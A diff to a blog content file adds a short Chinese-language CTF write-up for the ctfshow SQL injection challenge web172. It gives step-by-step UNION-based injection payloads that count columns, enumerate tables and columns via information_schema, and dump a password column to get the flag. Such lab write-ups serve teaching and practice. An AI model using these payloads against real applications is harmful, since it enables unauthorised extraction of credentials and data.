@@ -3482,6 +3482,18 @@ web82写的脚本改改直接用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/5%407OH%24R%5BIP0Q7E0%29PO%2815%282.png" alt=""></p>
 <h3 id="web172"><a class="header-anchor" href="#web172">¶</a>web172</h3>
+<p>这次变成了两列</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 2 --+</span><br></pre></td></tr></table></figure>
+<p>查数据库名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select database(),1--+</span><br></pre></td></tr></table></figure>
+<p>得到数据库名字为ctfshow_web，接着查表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(table_name),1 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+</span><br></pre></td></tr></table></figure>
+<p>得到有两个表，ctfshow_user和ctfshow_user2，直觉flag在第二个表中，直接查第二个表的列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(column_name),1 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user2&quot; --+</span><br></pre></td></tr></table></figure>
+<p>得到有id，username，password三个列名，查password</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select password,1 from ctfshow_user2--+</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h3 id="web173"><a class="header-anchor" href="#web173">¶</a>web173</h3>
 ]]></content>
       <tags>
         <tag>CTF</tag>
